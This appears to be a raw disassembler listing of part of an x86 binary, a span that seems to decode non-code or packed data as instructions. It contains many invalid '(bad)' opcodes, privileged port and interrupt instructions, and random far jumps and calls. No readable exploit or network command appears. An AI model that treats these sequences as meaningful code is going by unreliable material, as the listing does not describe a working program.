  418a50:	sub    al,0x9c
  418a52:	pop    esp
  418a53:	push   es
  418a54:	push   edi
  418a55:	mov    dh,0x62
  418a57:	daa    
  418a58:	jle    0x418ab6
  418a5a:	dec    ebp
  418a5b:	mov    eax,0xca984332
  418a60:	sbb    BYTE PTR ds:0x17c7bdac,dl
  418a66:	cmp    al,0x2b
  418a68:	fist   DWORD PTR [edi]
  418a6a:	(bad)  
  418a6c:	push   ecx
  418a6d:	in     al,dx
  418a6e:	push   esi
  418a6f:	into   
  418a70:	xchg   ebp,eax
  418a71:	xor    BYTE PTR [ebp+0x40],ah
  418a74:	and    DWORD PTR [ebx-0x407840da],esi
  418a7a:	xchg   BYTE PTR ds:0xbb45e9c8,al
  418a80:	imul   esp,DWORD PTR [ebx],0xb5213d93
  418a86:	rol    BYTE PTR [esi],0xfc
  418a89:	push   edi
  418a8a:	cmp    ch,dh
  418a8c:	clc    
  418a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a8e:	push   ecx
  418a8f:	mov    DWORD PTR [ebx+ecx*1],esi
  418a92:	js     0x418aaf
  418a94:	or     ecx,DWORD PTR [ebp-0x17]
  418a97:	jne    0x418ace
  418a99:	xchg   edi,eax
  418a9a:	dec    eax
  418a9b:	in     eax,0x5
  418a9d:	gs sub eax,0xffb87a4a
  418aa3:	test   DWORD PTR [eax-0x4548854a],edx
  418aa9:	xchg   bh,al
  418aab:	sbb    BYTE PTR [edx+eiz*8-0x2793e242],al
  418ab2:	ret    
  418ab3:	jp     0x418a9f
	...
  418b15:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b19:	xor    ch,bh
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0x4a0941ce
  418b23:	icebp  
  418b24:	fimul  DWORD PTR ds:0x10352
  418b2a:	pop    es
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    ch,al
  418b2f:	sbb    ebx,ebp
  418b31:	xor    al,BYTE PTR [edi-0x292a1f36]
  418b37:	inc    ecx
  418b38:	bnd fs jb 0x418b2f
  418b3c:	jb     0x418b39
  418b3e:	xor    al,0xfc
  418b40:	iret   
  418b41:	inc    esp
  418b42:	jns    0x418ad5
  418b44:	xchg   ebx,eax
  418b45:	inc    esp
  418b46:	inc    edi
  418b47:	pop    ebx
  418b48:	xor    eax,0xbaaedd28
  418b4d:	dec    edx
  418b4e:	pop    edi
  418b4f:	outs   dx,DWORD PTR ds:[esi]
  418b50:	push   edx
  418b51:	xchg   ebx,eax
  418b52:	pusha  
  418b53:	dec    esi
  418b54:	not    BYTE PTR [esi+0x6a103c50]
  418b5a:	push   edi
  418b5b:	repz sar BYTE PTR [eax-0x552af82d],0x10
  418b63:	mov    ch,0x12
  418b65:	mov    eax,0x671e005a
  418b6a:	push   ebx
  418b6b:	cmp    cl,BYTE PTR [ecx+ebx*1-0x45bf905d]
  418b72:	and    al,0x93
  418b74:	cwde   
  418b75:	es aaa 
  418b77:	jmp    0x14031741
  418b7c:	mov    WORD PTR [edx+esi*4],?
  418b7f:	scas   al,BYTE PTR es:[edi]
  418b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b81:	push   ss
  418b82:	push   ds
  418b83:	mov    edi,0xebaa545a
  418b88:	repnz adc ebx,esp
  418b8b:	je     0x418b87
  418b8d:	pop    ds
  418b8e:	(bad)  
  418b8f:	(bad)  
  418b91:	aaa    
  418b92:	dec    ecx
  418b93:	sbb    cl,dl
  418b95:	xchg   esp,eax
  418b96:	shr    DWORD PTR [esi],0x9b
  418b99:	xor    ah,bl
  418b9b:	cmp    eax,0x4007fc90
  418ba0:	adc    edx,DWORD PTR [edi-0x64]
  418ba3:	add    al,0xc1
  418ba5:	and    ebp,DWORD PTR [edi+0x14]
  418ba8:	push   esi
  418ba9:	pop    edi
  418baa:	test   eax,0x4ae9491a
  418baf:	es ds aaa 
  418bb2:	(bad)  
  418bb3:	xor    eax,0x45cc879e
  418bb8:	loope  0x418b3d
  418bba:	sbb    al,0xcf
  418bbc:	mov    WORD PTR [ebx-0x53],gs
  418bbf:	jo     0x418b4d
  418bc1:	std    
  418bc2:	mov    bl,0x67
  418bc4:	ret    
  418bc5:	or     bl,BYTE PTR [ecx+ecx*1]
  418bc8:	dec    ebp
  418bc9:	fisubr WORD PTR [edx-0x2b9e172c]
  418bcf:	sbb    dl,0x5b
  418bd2:	inc    esi
  418bd3:	out    0x85,al
  418bd5:	sub    ebx,DWORD PTR [eax]
  418bd7:	xchg   ecx,eax
  418bd8:	fcomp  DWORD PTR [ecx]
  418bda:	out    dx,al
  418bdb:	iret   
  418bdc:	sub    edx,DWORD PTR [edi+0xeb36a59]
  418be2:	cli    
  418be3:	or     BYTE PTR [edi+0x4e8bfcc3],al
  418be9:	fnstcw WORD PTR [ecx+0x70315c13]
  418bef:	ret    0xf26e
  418bf2:	aaa    
  418bf3:	xchg   esp,eax
  418bf4:	adc    cl,ch
  418bf6:	xchg   ebp,eax
  418bf7:	lahf   
  418bf8:	sar    BYTE PTR [edi+0x9d5f879],1
  418bfe:	cmp    BYTE PTR [ecx+0xa054526],0xb1
  418c05:	push   cs
  418c06:	xchg   ecx,eax
  418c07:	test   eax,0x94c814b
  418c0c:	dec    esp
  418c0d:	mov    ecx,0xf8710a9b
  418c12:	mov    eax,ds:0xdac25592
  418c17:	or     al,0x7f
  418c19:	shl    dl,0xf0
  418c1c:	push   edx
  418c1d:	sbb    DWORD PTR [ebx-0x9],0xf0c7383c
  418c24:	clc    
  418c25:	lahf   
  418c26:	push   cs
  418c27:	ret    0x7850
  418c2a:	jge    0x418bce
  418c2c:	lods   eax,DWORD PTR ds:[esi]
  418c2d:	and    BYTE PTR ds:0x25be9d53,cl
  418c33:	iret   
  418c34:	mov    al,0x0
	...
  418c96:	sti    
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    esi,DWORD PTR [edx-0x69]
  418ca4:	jmp    0x700:0x10459e8
  418cab:	add    DWORD PTR [eax],eax
  418cad:	add    BYTE PTR [ebx+0x72],ah
  418cb0:	sbb    cl,BYTE PTR [ecx-0x440ccdab]
  418cb6:	ficomp WORD PTR [ebp-0x79df20a3]
  418cbc:	mov    es,WORD PTR [ecx-0x6d]
  418cbf:	mov    al,0x69
  418cc1:	dec    ebx
  418cc2:	sub    eax,0x372fcc23
  418cc7:	mov    eax,ds:0xfa44638b
  418ccc:	xor    DWORD PTR [eax],0x1
  418ccf:	int    0xce
  418cd1:	ror    BYTE PTR [edi+0x6a1b61d1],cl
  418cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cd8:	pop    ds
  418cd9:	xchg   esp,eax
  418cda:	sbb    dh,BYTE PTR [eax]
  418cdc:	xchg   edx,eax
  418cdd:	stos   BYTE PTR es:[edi],al
  418cde:	retf   
  418cdf:	jl     0x418cbc
  418ce1:	inc    DWORD PTR [edi+ebx*8-0x3bc485f1]
  418ce8:	inc    ecx
  418ce9:	aaa    
  418cea:	neg    DWORD PTR [edi]
  418cec:	fwait
  418ced:	lahf   
  418cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cef:	mov    esi,0x62099b02
  418cf4:	mov    dh,0xa6
  418cf6:	jno    0x418cd6
  418cf8:	in     eax,dx
  418cf9:	cld    
  418cfa:	mov    ebp,0x933c1009
  418cff:	xchg   ebp,eax
  418d00:	imul   ebx,DWORD PTR [edi],0xbe93e417
  418d06:	dec    esp
  418d07:	add    DWORD PTR [ebx+0x30e49507],eax
  418d0d:	repnz mov edx,0x8c04e703
  418d13:	(bad)  
  418d15:	add    BYTE PTR [ebx+0x3c],dh
  418d18:	inc    esp
  418d19:	cmp    DWORD PTR [ecx-0x45ac7933],edi
  418d1f:	imul   edi,DWORD PTR [edx-0x6387bd19],0x54e0ef7
  418d29:	or     eax,0xc738d7a8
  418d2e:	ss push es
  418d30:	and    DWORD PTR [esi+0x7c],esp
  418d33:	lahf   
  418d34:	cmp    al,0xe5
  418d36:	in     al,dx
  418d37:	jp     0x418cd5
  418d39:	scas   al,BYTE PTR es:[edi]
  418d3a:	adc    ch,BYTE PTR [ecx]
  418d3c:	sbb    DWORD PTR [esi+edx*2+0x227d2a79],edi
  418d43:	mov    bl,0xe5
  418d45:	mov    eax,0x23bc3dd5
  418d4a:	jo     0x418d1e
  418d4c:	mov    al,0x1e
  418d4e:	add    eax,0x66275a5c
  418d53:	mov    edx,0xad3a858
  418d58:	xor    al,0xbb
  418d5a:	cld    
  418d5b:	mov    WORD PTR [eax+0x6c],es
  418d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d5f:	in     eax,0xd5
  418d61:	cmp    eax,0x9a423367
  418d66:	test   al,0xe5
  418d68:	stos   BYTE PTR es:[edi],al
  418d69:	sub    eax,0xa91f27be
  418d6e:	xchg   DWORD PTR [esi],ebx
  418d70:	mov    al,ds:0xfb9a58d7
  418d75:	jmp    0x70786a68
  418d7a:	std    
  418d7b:	cmp    al,0xa8
  418d7d:	adc    dh,dh
  418d7f:	jmp    0x1b05:0x33db464
  418d86:	adc    eax,0xc2ecff
  418d8b:	jb     0x418df3
  418d8d:	fdivr  QWORD PTR [ebx-0x110a83ad]
  418d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d94:	in     eax,dx
  418d95:	sbb    al,0x86
  418d97:	sahf   
  418d98:	pusha  
  418d99:	into   
  418d9a:	inc    esp
  418d9b:	retf   
  418d9c:	inc    ebp
  418d9d:	div    esp
  418d9f:	mov    ecx,0xdd5836b0
  418da4:	test   eax,0xf6344988
  418da9:	mov    esp,0x3ace4b2a
  418dae:	ret    
  418daf:	sbb    edi,DWORD PTR ss:[edi+0x78]
  418db3:	xor    eax,DWORD PTR [ebx]
	...
  418e15:	add    BYTE PTR [esi],cl
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0x1cf69b41
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	and    ebp,DWORD PTR [ebp-0x72dab4c5]
  418e34:	dec    esi
  418e35:	js     0x418de7
  418e37:	stos   DWORD PTR es:[edi],eax
  418e38:	aam    0x34
  418e3a:	dec    edx
  418e3b:	dec    ebp
  418e3c:	xor    al,0x72
  418e3e:	lahf   
  418e3f:	inc    edx
  418e40:	or     DWORD PTR [ecx-0x19],ebx
  418e43:	(bad)  
  418e44:	nop
  418e45:	dec    eax
  418e46:	jbe    0x418e9d
  418e48:	ins    BYTE PTR es:[edi],dx
  418e49:	adc    eax,0x3e96bd98
  418e4e:	adc    dl,BYTE PTR [ebp-0x64]
  418e51:	adc    ah,dl
  418e53:	jmp    0xd24b:0x8451aba2
  418e5a:	hlt    
  418e5b:	rcr    al,cl
  418e5d:	mov    BYTE PTR [ebx-0x1609f199],cl
  418e63:	stos   BYTE PTR es:[edi],al
  418e64:	pop    eax
  418e65:	sar    DWORD PTR [edx+0x39],1
  418e68:	mov    ch,BYTE PTR [edi+ebp*1+0x40f27c51]
  418e6f:	sub    edx,DWORD PTR [edx-0x3ddd4cf]
  418e75:	sar    ebp,cl
  418e77:	or     cl,cl
  418e79:	fcomp  QWORD PTR [edi]
  418e7b:	add    eax,0xbdf18156
  418e80:	test   DWORD PTR ds:0xa25ceaf6,edx
  418e86:	jb     0x418e8b
  418e88:	xor    BYTE PTR [edx],dh
  418e8a:	sahf   
  418e8b:	fnsave [edx-0x721e33ab]
  418e91:	fmul   DWORD PTR [esi]
  418e93:	enter  0x2d5b,0xd3
  418e97:	or     BYTE PTR [edi-0x1687428e],cl
  418e9d:	lds    ecx,FWORD PTR [edx-0x7c16f697]
  418ea3:	call   0x88526a2d
  418ea8:	push   cs
  418ea9:	shr    DWORD PTR [ebx+0x16],cl
  418eac:	(bad)  
  418ead:	jl     0x418ec1
  418eaf:	lods   al,BYTE PTR ds:[esi]
  418eb0:	lock push 0x2e
  418eb3:	mov    bl,0xbf
  418eb5:	mov    eax,0xef4e2ad2
  418eba:	popa   
  418ebb:	pop    ebx
  418ebd:	add    DWORD PTR [ebp+ecx*2-0x68b9a815],ecx
  418ec4:	fbstp  TBYTE PTR [edi-0x2ea9aa50]
  418eca:	lds    eax,FWORD PTR [edx]
  418ecc:	cmp    ah,bl
  418ece:	adc    BYTE PTR [ebp+0x49],0xa7
  418ed2:	inc    ecx
  418ed3:	pop    edx
  418ed4:	adc    DWORD PTR [eax],ebp
  418ed6:	ins    DWORD PTR es:[edi],dx
  418ed7:	mov    ecx,0x23bb3855
  418edc:	in     al,dx
  418edd:	mov    DWORD PTR ss:[si+0x59],ebp
  418ee2:	mov    bh,0xa9
  418ee4:	mov    edx,0x3c76ce67
  418ee9:	pop    esi
  418eea:	pop    edi
  418eeb:	adc    BYTE PTR [ebp-0x7f],dl
  418eee:	inc    ebp
  418eef:	jle    0x418e74
  418ef1:	ins    BYTE PTR es:[edi],dx
  418ef2:	push   esp
  418ef3:	jne    0x418f45
  418ef5:	jno    0x418ee0
  418ef7:	jae    0x418eb6
  418ef9:	stos   DWORD PTR es:[edi],eax
  418efa:	shr    ebx,1
  418efc:	lea    eax,[eax+0x50]
  418eff:	ret    
  418f00:	ja     0x418ec1
  418f02:	cmp    DWORD PTR [ebx],edi
  418f04:	cmc    
  418f05:	xchg   BYTE PTR [edx+ecx*2-0x7a],dl
  418f09:	ins    DWORD PTR es:[edi],dx
  418f0a:	inc    edi
  418f0b:	add    esi,DWORD PTR [esi+edx*8]
  418f0e:	test   DWORD PTR [eax+0x24],0xcfd4965a
  418f15:	sub    DWORD PTR [edi-0x61],0x38
  418f19:	test   DWORD PTR [ebx],ecx
  418f1b:	push   ebx
  418f1c:	push   ebx
  418f1d:	add    ebx,DWORD PTR [esi]
  418f1f:	enter  0x9142,0x9e
  418f23:	mov    ebx,0xa5d8b1fd
  418f28:	sub    bl,0x54
  418f2b:	rcl    DWORD PTR [ebx+eax*8],1
  418f2e:	ja     0x418ee0
  418f30:	pop    ss
  418f31:	test   BYTE PTR [eax+0xc358],ch
	...
  418f93:	add    BYTE PTR [eax],al
  418f95:	add    BYTE PTR [edi+edx*4],bl
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp-0x6885234e]
  418fa3:	ss xchg ebp,eax
  418fa5:	pushf  
  418fa6:	addr16 push es
  418fa8:	add    DWORD PTR [eax],eax
  418faa:	pop    es
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    BYTE PTR [edi+0x46],dl
  418fb0:	pop    eax
  418fb1:	dec    esp
  418fb2:	adc    DWORD PTR [ebx],0x4f
  418fb5:	aad    0xa1
  418fb7:	xchg   edi,eax
  418fb8:	jecxz  0x418f50
  418fba:	mov    dh,0x14
  418fbc:	or     BYTE PTR [ebx],0xa3
  418fbf:	xchg   BYTE PTR [ebx],cl
  418fc1:	or     al,0xee
  418fc3:	mov    ecx,0xf0898a3f
  418fc8:	pop    esi
  418fc9:	dec    esi
  418fca:	push   edx
  418fcb:	gs out 0xa7,eax
  418fce:	nop
  418fcf:	sub    ebp,DWORD PTR [edi+0x15358c86]
  418fd5:	daa    
  418fd6:	and    ah,0x3d
  418fd9:	sar    BYTE PTR [ebp+0x44],cl
  418fdc:	add    al,0x98
  418fde:	inc    eax
  418fdf:	cwde   
  418fe0:	cwde   
  418fe1:	push   edi
  418fe2:	jecxz  0x418fc7
  418fe4:	push   ss
  418fe5:	pop    esi
  418fe6:	loopne 0x418fa5
  418fe8:	hlt    
  418fe9:	and    eax,0x9270296d
  418fee:	lods   eax,DWORD PTR ds:[esi]
  418fef:	jns    0x419013
  418ff1:	daa    
  418ff2:	hlt    
  418ff3:	test   DWORD PTR [esi-0x3de4378c],edi
  418ff9:	stos   BYTE PTR es:[edi],al
  418ffa:	loopne 0x419017
  418ffc:	shr    dh,1
  418ffe:	push   es
  418fff:	mov    ch,al
  419001:	outs   dx,DWORD PTR ds:[esi]
  419002:	add    BYTE PTR [esi-0x5a8c9558],dl
  419008:	jnp    0x418ff2
  41900a:	pop    esi
  41900b:	test   eax,0xceeb040e
  419010:	jbe    0x418fdd
  419012:	mov    edi,0xa304b9ad
  419017:	jmp    esi
  419019:	sub    dh,al
  41901b:	adc    edx,edi
  41901d:	cmp    BYTE PTR [edi+edi*8+0x30],bh
  419021:	sbb    ch,ch
  419023:	lods   al,BYTE PTR ds:[esi]
  419024:	out    dx,eax
  419025:	dec    eax
  419026:	inc    ecx
  419027:	mov    cl,0x62
  419029:	xor    al,0x36
  41902b:	xor    al,0xca
  41902d:	push   ebp
  41902e:	jns    0x418fd0
  419030:	xchg   ebp,eax
  419031:	sub    al,0x3a
  419033:	pusha  
  419034:	mov    ch,0x7a
  419036:	fst    DWORD PTR [edi+esi*2-0x10]
  41903a:	retf   0x2ec3
  41903d:	or     BYTE PTR [edx+0x33],al
  419040:	xor    ebp,DWORD PTR [ecx]
  419042:	leave  
  419043:	psrlq  mm6,QWORD PTR [eax+0x4c2a3cbd]
  41904a:	in     al,0x2f
  41904c:	(bad)  
  41904e:	mov    eax,ds:0x5d5cbb98
  419053:	and    al,0xde
  419055:	jg     0x418fde
  419057:	push   edx
  419058:	mov    ecx,0xa0468bdb
  41905d:	mov    esi,?
  41905f:	retf   
  419060:	lods   eax,DWORD PTR ds:[esi]
  419061:	sbb    ebx,DWORD PTR [eax-0x4a]
  419064:	mov    BYTE PTR [edx+0x7a],al
  419067:	retf   0x7ad0
  41906a:	dec    esp
  41906b:	outs   dx,BYTE PTR ds:[esi]
  41906c:	mov    esp,0x76448307
  419071:	cwde   
  419072:	inc    esp
  419073:	shr    DWORD PTR [ebp+0x2c628578],0x18
  41907a:	xor    esp,DWORD PTR [ebx]
  41907c:	imul   edi,DWORD PTR [eax+eax*1+0x4b],0xffffffde
  419081:	fldcw  WORD PTR [eax]
  419083:	dec    esp
  419084:	sbb    eax,0x2ea209f1
  419089:	repz push eax
  41908b:	dec    ebx
  41908c:	or     eax,0xe888afe7
  419091:	xchg   ecx,eax
  419092:	sbb    ch,bl
  419094:	and    al,0x2c
  419096:	scas   al,BYTE PTR es:[edi]
  419097:	cld    
  419098:	sbb    BYTE PTR [edx+0x3b7b1ae2],ah
  41909e:	call   0x6f8b834f
  4190a3:	xchg   esp,eax
  4190a4:	ins    BYTE PTR es:[edi],dx
  4190a5:	clc    
  4190a6:	and    BYTE PTR [eax+0x19],ah
  4190a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190aa:	into   
  4190ab:	xor    BYTE PTR [ecx-0x58],dh
  4190ae:	dec    BYTE PTR [esi+0x7cefcd0f]
  4190b4:	add    BYTE PTR fs:[eax],al
	...
  419113:	add    BYTE PTR [eax],al
  419115:	add    BYTE PTR [edi-0x41bd617b],ch
  41911b:	pop    ebx
  41911c:	(bad)  
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    esi,DWORD PTR [ecx]
  419123:	inc    edi
  419124:	mov    cl,0xfc
  419126:	outs   dx,BYTE PTR ds:[esi]
  419127:	pop    es
  419128:	add    DWORD PTR [eax],eax
  41912a:	pop    es
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    BYTE PTR [ebx],bh
  41912f:	(bad)  
  419130:	cs ret 
  419132:	ins    DWORD PTR es:[edi],dx
  419133:	aas    
  419134:	and    BYTE PTR [ecx],cl
  419136:	mov    ds:0xb79ec4e6,al
  41913b:	mov    bh,0xe9
  41913d:	cmp    BYTE PTR [edx+0x2c],ah
  419140:	fisttp DWORD PTR [ebp-0x28]
  419143:	dec    edx
  419144:	or     eax,0x7757d99a
  419149:	cld    
  41914a:	jae    0x419192
  41914c:	dec    esp
  41914d:	fidiv  WORD PTR [edx]
  41914f:	cwde   
  419150:	or     al,0x9b
  419152:	mov    esp,0xb5198199
  419157:	jmp    0x7c74:0x2730f39e
  41915e:	aad    0x10
  419160:	add    ah,dh
  419162:	rcr    dl,0xf8
  419165:	sub    eax,0xe3519743
  41916a:	mov    DWORD PTR [esi-0x39],edx
  41916d:	jae    0x419133
  41916f:	mov    BYTE PTR [esi],0x23
  419172:	data16 and al,0x3c
  419175:	jp     0x419145
  419177:	cmp    eax,esp
  419179:	cmp    BYTE PTR [ecx-0x3950bd],dh
  41917f:	or     edx,DWORD PTR [esp+edx*1+0x1d]
  419183:	lahf   
  419184:	inc    eax
  419185:	cdq    
  419186:	push   edi
  419187:	call   0xf9c7:0x54546ee4
  41918e:	dec    esi
  41918f:	fld    QWORD PTR [ecx-0x417d8f5d]
  419195:	jb     0x4191a4
  419197:	mov    WORD PTR [edi],gs
  419199:	mov    eax,ds:0x157f927d
  41919e:	lea    ax,[ebx+0x30]
  4191a2:	fdiv   QWORD PTR [esi-0x38]
  4191a5:	or     ebx,DWORD PTR [edx]
  4191a7:	gs push ebp
  4191a9:	int    0xfe
  4191ab:	dec    esp
  4191ac:	es inc ebx
  4191ae:	into   
  4191af:	mov    al,ds:0xea7d0969
  4191b4:	(bad)  
  4191b5:	idiv   dh
  4191b7:	jno    0x4191e9
  4191b9:	call   0x1f31:0x541e5b38
  4191c0:	fld    DWORD PTR [eax-0x180c7050]
  4191c6:	sbb    BYTE PTR [esi+0x3c],ch
  4191c9:	in     eax,0x25
  4191cb:	popa   
  4191cc:	mov    dl,0x58
  4191ce:	sbb    ebp,esi
  4191d0:	inc    esi
  4191d1:	(bad)  
  4191d2:	js     0x419241
  4191d4:	dec    eax
  4191d5:	(bad)  
  4191d7:	aad    0xf4
  4191d9:	inc    BYTE PTR [ebx+esi*4+0x71a408ff]
  4191e0:	push   eax
  4191e1:	cs std 
  4191e3:	mov    ecx,0x558f3612
  4191e8:	not    DWORD PTR [eax+0x6c]
  4191eb:	mov    eax,0x2d475668
  4191f0:	mul    dh
  4191f2:	add    DWORD PTR [esi],esp
  4191f4:	jns    0x4191b2
  4191f6:	outs   dx,DWORD PTR ds:[esi]
  4191f7:	mov    DWORD PTR [ebp-0x77345e6f],ebx
  4191fd:	adc    eax,DWORD PTR [ecx+esi*4-0x3d]
  419201:	xor    eax,0x6c83509d
  419206:	xchg   esp,eax
  419207:	ror    BYTE PTR [ebp*1+0x1cba0fd7],0xda
  41920f:	repnz test BYTE PTR [edx],ch
  419212:	xchg   edx,eax
  419213:	imul   ecx,ecx,0xffffffa1
  419216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419217:	cmp    DWORD PTR [ebx],0x7ac85fc8
  41921d:	cs in  eax,dx
  41921f:	and    cl,0x3e
  419222:	lahf   
  419223:	or     al,0x15
  419225:	retf   
  419226:	dec    ebp
  419227:	(bad)  
  419228:	xchg   ecx,eax
  419229:	ins    BYTE PTR es:[edi],dx
  41922a:	jo     0x4191f2
  41922c:	pop    ebx
  41922d:	or     DWORD PTR [edi],esi
  41922f:	xchg   edx,eax
  419230:	sub    DWORD PTR [ebx+0xa0759a],esi
	...
  419296:	mov    al,ds:0xff33bae7
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0x62aeb04f
  4192a5:	inc    esi
  4192a6:	jne    0x4192b0
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [ebp+0x336f54d8],ah
  4192b3:	(bad)  
  4192b4:	iret   
  4192b5:	sbb    bh,bh
  4192b7:	sub    DWORD PTR [ecx],edi
  4192b9:	(bad)  
  4192bb:	icebp  
  4192bc:	ins    BYTE PTR es:[edi],dx
  4192bd:	es aam 0x1
  4192c0:	test   eax,0xa739b9e4
  4192c5:	adc    DWORD PTR [esi+0x73],esp
  4192c8:	push   ds
  4192c9:	xor    BYTE PTR [ebx-0x7337d683],0x24
  4192d0:	test   eax,0x13785973
  4192d5:	adc    bh,BYTE PTR ds:0xb9651e43
  4192db:	or     ecx,DWORD PTR [esi]
  4192dd:	fadd   DWORD PTR [eax]
  4192df:	add    dl,bl
  4192e1:	xor    ecx,DWORD PTR [ebp+0x4b]
  4192e4:	fptan  
  4192e6:	sbb    DWORD PTR [edx-0x2b2ad52f],ebx
  4192ec:	mov    BYTE PTR [edi],dh
  4192ee:	call   0x1af:0x761d9011
  4192f5:	add    dh,BYTE PTR [ecx-0x6610de02]
  4192fb:	call   0x8c0f:0x71d23b79
  419302:	addr16 ja 0x419348
  419305:	inc    esp
  419306:	sbb    BYTE PTR [edi+ecx*1],al
  419309:	ins    DWORD PTR es:[edi],dx
  41930a:	add    esp,DWORD PTR [edx]
  41930c:	loope  0x419377
  41930e:	jno    0x4192c2
  419310:	sahf   
  419311:	adc    ebp,DWORD PTR [ebp-0x1c]
  419314:	mov    eax,DWORD PTR [ecx]
  419316:	inc    ebx
  419317:	(bad)  
  419319:	outs   dx,BYTE PTR ds:[esi]
  41931a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41931b:	xchg   ebp,eax
  41931c:	sahf   
  41931d:	pop    eax
  41931e:	out    0xd9,eax
  419320:	mov    ebp,0xd976a5b1
  419325:	ss imul ebp,ebp,0x54
  419329:	mov    ch,BYTE PTR [ecx-0x1867eb22]
  41932f:	loope  0x419386
  419331:	jb     0x419313
  419333:	addr16 (bad) 
  419335:	call   0x1db3:0xbbfdc993
  41933c:	xchg   esi,eax
  41933d:	icebp  
  41933e:	cdq    
  41933f:	loop   0x41939a
  419341:	lds    ebp,FWORD PTR [ebp+ecx*1-0x79b8c14c]
  419348:	sar    DWORD PTR [edi-0x59],0x85
  41934c:	jnp    0x4192fa
  41934e:	mov    edi,0xaf5b935f
  419353:	pop    ss
  419354:	js     0x419362
  419356:	out    0x52,eax
  419358:	mov    al,0x83
  41935a:	jae    0x419310
  41935c:	sub    WORD PTR [edi-0x34],si
  419360:	aad    0x50
  419362:	adc    eax,DWORD PTR [edi]
  419364:	pop    ss
  419365:	pop    ds
  419366:	pop    ebp
  419367:	stos   DWORD PTR es:[edi],eax
  419368:	jmp    0xd657:0x25835f50
  41936f:	sbb    ebx,ecx
  419371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419372:	ja     0x41930d
  419374:	xchg   ecx,eax
  419375:	dec    BYTE PTR [ebx]
  419377:	pop    esp
  419378:	lahf   
  419379:	loope  0x41931d
  41937b:	loope  0x4193e9
  41937d:	cmp    BYTE PTR [esp+esi*8],ch
  419380:	jno    0x41931f
  419382:	sbb    DWORD PTR [edi],ebp
  419384:	test   eax,0x8ca36367
  419389:	dec    eax
  41938a:	and    DWORD PTR [ebx-0x44c3389f],esi
  419390:	mov    ebp,0x3a776dfe
  419395:	jge    0x41938c
  419397:	push   edx
  419398:	les    ebp,FWORD PTR [ecx-0x80]
  41939b:	xchg   ebp,eax
  41939c:	lahf   
  41939d:	retf   0x7b3d
  4193a0:	sbb    eax,0x7602952d
  4193a5:	mov    al,ds:0xb51e2964
  4193aa:	xchg   ebp,eax
  4193ab:	and    eax,0xcb47b738
  4193b0:	shl    BYTE PTR [edx],1
  4193b2:	mov    ch,0x23
  4193b4:	xchg   ebx,eax
	...
  419415:	add    BYTE PTR ds:0xed3a6998,bh
  41941b:	sti    
  41941c:	jg     0x4193bd
  41941e:	les    ecx,FWORD PTR [ebp+ebp*8+0x23fbca37]
  419425:	push   ecx
  419426:	jl     0x419431
  419428:	add    DWORD PTR [eax],eax
  41942a:	pop    es
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    BYTE PTR [eax+0x18ff6589],dh
  419433:	iret   
  419434:	mov    bh,0xb8
  419436:	xchg   edi,eax
  419437:	xchg   ecx,eax
  419438:	repnz not DWORD PTR [edx]
  41943b:	jp     0x41947d
  41943d:	fbld   TBYTE PTR [esi+0x25]
  419440:	cmc    
  419441:	mov    dh,0x4f
  419443:	lock pop esi
  419445:	retf   
  419446:	ret    0x2a74
  419449:	sub    BYTE PTR [eax],al
  41944b:	aad    0x30
  41944d:	ror    al,0x68
  419450:	add    eax,0xfee2bcb9
  419455:	inc    edx
  419456:	sbb    al,0x9
  419458:	mov    eax,ds:0xbf2efbf2
  41945d:	or     al,0x75
  41945f:	addr16 xor al,0x98
  419462:	or     edi,DWORD PTR [edx]
  419464:	and    BYTE PTR [eax],0x2d
  419467:	enter  0x2310,0x41
  41946b:	mov    esi,0xdc3f87ab
  419470:	or     bl,BYTE PTR [edx]
  419472:	std    
  419473:	jbe    0x419480
  419475:	(bad)  
  419476:	sbb    DWORD PTR [ecx-0x48c523c1],esp
  41947c:	clc    
  41947d:	gs idiv ebp
  419480:	cmp    BYTE PTR [ecx+esi*4+0x3374463e],ah
  419487:	inc    edx
  419488:	mov    cl,BYTE PTR [edi-0x712cb86]
  41948e:	cli    
  41948f:	(bad)  
  419490:	sbb    eax,0xb29d9b7f
  419495:	or     eax,0x5157b79e
  41949b:	es adc al,0x23
  41949e:	pop    es
  41949f:	out    dx,al
  4194a0:	fld    QWORD PTR [ebp+0x21]
  4194a3:	xchg   DWORD PTR [edi-0x51],esi
  4194a6:	xor    eax,DWORD PTR ds:[edx-0x26]
  4194aa:	test   DWORD PTR [eax+ecx*1-0x3b57393],ebx
  4194b1:	and    cl,dl
  4194b3:	call   0x47547f0f
  4194b8:	sbb    al,0x3a
  4194ba:	sbb    al,0x75
  4194bc:	inc    ebx
  4194be:	push   eax
  4194bf:	pop    edi
  4194c0:	inc    edi
